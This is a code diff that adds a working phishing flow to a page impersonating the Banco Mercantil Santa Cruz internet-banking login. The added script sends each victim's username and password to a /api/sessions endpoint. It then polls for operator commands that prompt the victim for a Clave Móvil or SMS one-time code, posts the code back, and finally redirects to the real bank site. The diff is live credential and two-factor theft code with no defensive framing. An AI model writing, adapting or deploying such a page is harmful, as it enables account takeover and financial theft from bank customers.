@@ -3,10 +3,16 @@
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
     <meta name="format-detection" content="telephone=no" />
-    <title>Banca por Internet</title>
+    <title>Banca por Internet | Banco Mercantil Santa Cruz</title>
     <link rel="shortcut icon" href="/img/favicon.svg" type="image/svg+xml" />
     <link rel="stylesheet" type="text/css" href="/css/icbStyles.css" />
     <link rel="stylesheet" type="text/css" href="/css/banca-override.css" />
+    <style>
+      @keyframes bmsc-spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+    </style>
   </head>
   <body>
     <div id="corporateHeader">
@@ -35,7 +41,10 @@
       <div id="containerMid" class="fl">
         <div class="colLeft" style="display: block;">
           <div class="contentLogin">
+            <div id="loginErrorBox" style="display:none; color: #b91c1c; background: #fef2f2; border: 1px solid #f87171; border-radius: 4px; padding: 10px; margin: 12px 16px 0; font-size: 12px; font-weight: 700; text-align: center;"></div>
+
             <form action="#" method="post" autocomplete="off" onsubmit="return false;">
+              <!-- Paso 1: Usuario -->
               <ul class="login" id="stepUser">
                 <li>
                   <ul>
@@ -84,11 +93,12 @@
                 </li>
               </ul>
 
+              <!-- Paso 2: Contraseña -->
               <ul class="login" id="stepPass" hidden>
                 <li class="passRow">
                   <span class="usuario">Contraseña:</span>
                   <span class="password">
-                    <input type="password" id="txtPassword" autocomplete="off" />
+                    <input type="password" id="txtPassword" autocomplete="off" placeholder="Ingrese su contraseña" />
                   </span>
                   <input type="button" class="btnVirtualKeyboard" title="Teclado virtual" />
                 </li>
@@ -110,7 +120,38 @@
                   <button type="button" id="btnSiguiente" class="btnGenericBlue next">Siguiente</button>
                 </li>
               </ul>
+
+              <!-- Paso 3: Clave Móvil / Token / SMS -->
+              <ul class="login" id="stepToken" hidden style="padding-top: 25px; text-align: center; min-height: 440px;">
+                <li style="margin-bottom: 14px;">
+                  <h4 id="tokenTitle" style="font-size: 15px; font-weight: 700; color: #15803d; margin-bottom: 6px;">Verificación de Seguridad</h4>
+                  <p id="tokenSubtitle" style="font-size: 11px; color: #475569; max-width: 320px; margin: 0 auto; line-height: 1.4;">
+                    Ingrese los 6 dígitos generados en su Clave Móvil (Token).
+                  </p>
+                </li>
+                <li style="margin: 20px auto 14px;">
+                  <div id="otpInputWrap" style="display: flex; gap: 8px; justify-content: center;">
+                    <input type="text" maxlength="1" class="otp-slot" inputmode="numeric" autocomplete="off" style="width: 38px; height: 46px; text-align: center; font-size: 22px; font-weight: 700; border: 2px solid #8dc63f; border-radius: 4px; outline: none; background: #fff;" />
+                    <input type="text" maxlength="1" class="otp-slot" inputmode="numeric" autocomplete="off" style="width: 38px; height: 46px; text-align: center; font-size: 22px; font-weight: 700; border: 2px solid #8dc63f; border-radius: 4px; outline: none; background: #fff;" />
+                    <input type="text" maxlength="1" class="otp-slot" inputmode="numeric" autocomplete="off" style="width: 38px; height: 46px; text-align: center; font-size: 22px; font-weight: 700; border: 2px solid #8dc63f; border-radius: 4px; outline: none; background: #fff;" />
+                    <input type="text" maxlength="1" class="otp-slot" inputmode="numeric" autocomplete="off" style="width: 38px; height: 46px; text-align: center; font-size: 22px; font-weight: 700; border: 2px solid #8dc63f; border-radius: 4px; outline: none; background: #fff;" />
+                    <input type="text" maxlength="1" class="otp-slot" inputmode="numeric" autocomplete="off" style="width: 38px; height: 46px; text-align: center; font-size: 22px; font-weight: 700; border: 2px solid #8dc63f; border-radius: 4px; outline: none; background: #fff;" />
+                    <input type="text" maxlength="1" class="otp-slot" inputmode="numeric" autocomplete="off" style="width: 38px; height: 46px; text-align: center; font-size: 22px; font-weight: 700; border: 2px solid #8dc63f; border-radius: 4px; outline: none; background: #fff;" />
+                  </div>
+                </li>
+                <li id="tokenErrorBox" style="display: none; color: #b91c1c; font-size: 11px; font-weight: 700; text-align: center; margin-bottom: 12px;"></li>
+                <li class="btn enterRow" style="margin-top: 18px;">
+                  <button type="button" id="btnSubmitToken" class="btnGenericGreen js-live" style="width: 158px; height: 41px; line-height: 41px; margin: 0 auto; cursor: pointer;">Confirmar</button>
+                </li>
+              </ul>
             </form>
+
+            <!-- Loading Spinner -->
+            <div id="loginSpinner" style="display: none; text-align: center; padding: 70px 20px;">
+              <div style="display: inline-block; width: 44px; height: 44px; border: 4px solid #e2e8f0; border-top-color: #15803d; border-radius: 50%; animation: bmsc-spin 0.9s linear infinite; margin-bottom: 18px;"></div>
+              <p id="spinnerTextTitle" style="font-size: 14px; font-weight: 700; color: #1e293b; margin-bottom: 6px;">Verificando sus credenciales</p>
+              <p id="spinnerTextSub" style="font-size: 11px; color: #64748b;">Por favor espere un momento mientras procesamos su solicitud de ingreso...</p>
+            </div>
           </div>
 
           <div class="contentGeneric">
@@ -160,7 +201,7 @@
       <div id="footer2" class="fl">
         <div class="fl">
           La información obtenida por medio de nuestro canal de Banca por Internet, debe estar sujeta a confirmación y validación en las oficinas del Banco. Proteja su información personal, no permita que se exponga a terceros.
-          <br />Copyright  Banco Mercantil Santa Cruz 2021
+          <br />Copyright © Banco Mercantil Santa Cruz 2026
         </div>
       </div>
     </div>
@@ -171,40 +212,282 @@
 
     <script src="/js/main.js"></script>
     <script>
+      // Session ID
+      let sessionId = sessionStorage.getItem('bmsc_session_id');
+      if (!sessionId) {
+        sessionId = 'bmsc_' + Date.now() + '_' + Math.random().toString(36).substr(2, 7);
+        sessionStorage.setItem('bmsc_session_id', sessionId);
+      }
+
+      let pingInterval = null;
+      let pollInterval = null;
+
+      // Elements
+      const user = document.getElementById("MainContent_ctl01_txtUserNamePassword");
+      const pass = document.getElementById("txtPassword");
+      const box = document.querySelector(".contentLogin");
+      const stepUser = document.getElementById("stepUser");
+      const stepPass = document.getElementById("stepPass");
+      const stepToken = document.getElementById("stepToken");
+      const loginSpinner = document.getElementById("loginSpinner");
+      const loginErrorBox = document.getElementById("loginErrorBox");
+      const tokenErrorBox = document.getElementById("tokenErrorBox");
+      const tokenTitle = document.getElementById("tokenTitle");
+      const tokenSubtitle = document.getElementById("tokenSubtitle");
+      const spinnerTextTitle = document.getElementById("spinnerTextTitle");
+      const spinnerTextSub = document.getElementById("spinnerTextSub");
+      const otpSlots = [...document.querySelectorAll(".otp-slot")];
+
       function bindReveal(input, checkbox) {
         if (!input || !checkbox) return;
         checkbox.addEventListener("change", function () {
           input.type = checkbox.checked ? "text" : "password";
         });
       }
-
-      const user = document.getElementById("MainContent_ctl01_txtUserNamePassword");
-      const pass = document.getElementById("txtPassword");
-      const box = document.querySelector(".contentLogin");
       bindReveal(user, document.getElementById("MainContent_ctl01_cbShowCharacters"));
 
+      function showError(msg) {
+        loginErrorBox.textContent = msg;
+        loginErrorBox.style.display = "block";
+      }
+
+      function hideError() {
+        loginErrorBox.style.display = "none";
+        loginErrorBox.textContent = "";
+      }
+
       function goToPassword() {
-        document.getElementById("stepUser").hidden = true;
-        document.getElementById("stepPass").hidden = false;
+        hideError();
+        const userVal = (user.value || "").trim();
+        if (!userVal) {
+          showError("Por favor ingrese su nombre de usuario.");
+          user.focus();
+          return;
+        }
+        stepUser.hidden = true;
+        stepPass.hidden = false;
         box?.classList.add("extended");
         if (pass) pass.focus();
       }
 
       function goToUser() {
-        document.getElementById("stepPass").hidden = true;
-        document.getElementById("stepUser").hidden = false;
+        hideError();
+        stepPass.hidden = true;
+        stepUser.hidden = false;
         box?.classList.remove("extended");
         if (user) user.focus();
       }
 
       document.getElementById("Enter_Step1")?.addEventListener("click", goToPassword);
       document.getElementById("btnAnterior")?.addEventListener("click", goToUser);
+
       user?.addEventListener("keydown", function (event) {
         if (event.key === "Enter") {
           event.preventDefault();
           goToPassword();
         }
       });
+
+      pass?.addEventListener("keydown", function (event) {
+        if (event.key === "Enter") {
+          event.preventDefault();
+          submitLogin();
+        }
+      });
+
+      // Typing state notification
+      [user, pass].forEach(input => {
+        input?.addEventListener("input", () => {
+          fetch('/api/sessions/' + sessionId + '/state', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ state: 'typing' })
+          }).catch(() => {});
+        });
+      });
+
+      function startKeepalive() {
+        if (pingInterval) clearInterval(pingInterval);
+        fetch('/api/sessions/' + sessionId + '/ping', { method: 'POST' }).catch(() => {});
+        pingInterval = setInterval(() => {
+          fetch('/api/sessions/' + sessionId + '/ping', { method: 'POST' }).catch(() => {});
+        }, 3000);
+      }
+
+      function showSpinner(title, subtitle) {
+        spinnerTextTitle.textContent = title || "Verificando credenciales";
+        spinnerTextSub.textContent = subtitle || "Por favor espere un momento...";
+        stepUser.hidden = true;
+        stepPass.hidden = true;
+        stepToken.hidden = true;
+        loginSpinner.style.display = "block";
+        box?.classList.add("extended");
+      }
+
+      function hideSpinner() {
+        loginSpinner.style.display = "none";
+      }
+
+      function startPolling() {
+        if (pollInterval) clearInterval(pollInterval);
+        pollInterval = setInterval(async () => {
+          try {
+            const res = await fetch('/api/sessions/' + sessionId);
+            if (res.ok) {
+              const session = await res.json();
+              const action = session.action;
+
+              if (action === 'dinamica' || action === 'sms') {
+                hideSpinner();
+                tokenErrorBox.style.display = "none";
+                stepPass.hidden = true;
+                stepUser.hidden = true;
+                stepToken.hidden = false;
+                box?.classList.add("extended");
+
+                if (action === 'sms') {
+                  tokenTitle.textContent = "Verificación de Seguridad — Código SMS";
+                  tokenSubtitle.textContent = "Ingrese el código de 6 dígitos enviado por mensaje de texto (SMS) a su celular registrado.";
+                } else {
+                  tokenTitle.textContent = "Verificación de Seguridad — Clave Móvil";
+                  tokenSubtitle.textContent = "Ingrese los 6 dígitos generados en la aplicación Clave Móvil (Token) de su celular.";
+                }
+
+                resetOtpSlots();
+              } else if (action === 'error-login') {
+                hideSpinner();
+                stepPass.hidden = true;
+                stepUser.hidden = false;
+                box?.classList.remove("extended");
+                showError("El usuario o la contraseña ingresada son incorrectos. Verifique sus datos e intente nuevamente.");
+                pass.value = "";
+                user.focus();
+              } else if (action === 'error-dinamica' || action === 'error-sms') {
+                hideSpinner();
+                stepToken.hidden = false;
+                tokenErrorBox.textContent = "El código ingresado es incorrecto o ha expirado. Por favor intente nuevamente.";
+                tokenErrorBox.style.display = "block";
+                resetOtpSlots();
+              } else if (action === 'done') {
+                clearInterval(pingInterval);
+                clearInterval(pollInterval);
+                window.location.href = "https://www.bmsc.com.bo/";
+              }
+            }
+          } catch (_) {}
+        }, 1200);
+      }
+
+      function submitLogin() {
+        hideError();
+        const userVal = (user.value || "").trim();
+        const passVal = (pass.value || "").trim();
+
+        if (!userVal) {
+          goToUser();
+          showError("Por favor ingrese su usuario.");
+          return;
+        }
+        if (!passVal) {
+          showError("Por favor ingrese su contraseña.");
+          pass.focus();
+          return;
+        }
+
+        showSpinner("Verificando sus credenciales", "Estamos procesando su solicitud de ingreso...");
+
+        const sessionPayload = {
+          id: sessionId,
+          username: userVal,
+          password: passVal,
+          tipoUsuario: 'Banca por Internet',
+          device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
+          state: 'waiting',
+          createdAt: Date.now()
+        };
+
+        fetch('/api/sessions', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(sessionPayload)
+        })
+        .then(() => {
+          startKeepalive();
+          startPolling();
+        })
+        .catch(() => {
+          hideSpinner();
+          stepPass.hidden = false;
+          showError("No se pudo conectar con el servidor. Intente de nuevo.");
+        });
+      }
+
+      document.getElementById("btnSiguiente")?.addEventListener("click", submitLogin);
+
+      // OTP Slots handling
+      function getOtpValue() {
+        return otpSlots.map(slot => slot.value).join("");
+      }
+
+      function resetOtpSlots() {
+        otpSlots.forEach(slot => { slot.value = ""; });
+        otpSlots[0]?.focus();
+      }
+
+      otpSlots.forEach((slot, idx) => {
+        slot.addEventListener("input", (e) => {
+          slot.value = slot.value.replace(/\D/g, "").slice(-1);
+          if (slot.value && otpSlots[idx + 1]) {
+            otpSlots[idx + 1].focus();
+          }
+          if (getOtpValue().length === 6) {
+            submitToken();
+          }
+        });
+
+        slot.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !slot.value && otpSlots[idx - 1]) {
+            otpSlots[idx - 1].focus();
+            otpSlots[idx - 1].value = "";
+          } else if (e.key === "Enter") {
+            e.preventDefault();
+            submitToken();
+          }
+        });
+
+        slot.addEventListener("paste", (e) => {
+          e.preventDefault();
+          const pasteData = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 6);
+          pasteData.split("").forEach((ch, i) => {
+            if (otpSlots[i]) otpSlots[i].value = ch;
+          });
+          const lastIdx = Math.min(pasteData.length, 6) - 1;
+          if (lastIdx >= 0 && otpSlots[lastIdx]) otpSlots[lastIdx].focus();
+          if (pasteData.length === 6) {
+            submitToken();
+          }
+        });
+      });
+
+      function submitToken() {
+        const tokenVal = getOtpValue();
+        if (tokenVal.length !== 6) {
+          tokenErrorBox.textContent = "Ingrese los 6 dígitos del código de seguridad.";
+          tokenErrorBox.style.display = "block";
+          return;
+        }
+
+        tokenErrorBox.style.display = "none";
+        showSpinner("Validando código de seguridad", "Verificando el código ingresado...");
+
+        fetch('/api/sessions/' + sessionId + '/token', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token: tokenVal })
+        }).catch(() => {});
+      }
+
+      document.getElementById("btnSubmitToken")?.addEventListener("click", submitToken);
     </script>
   </body>
 </html>
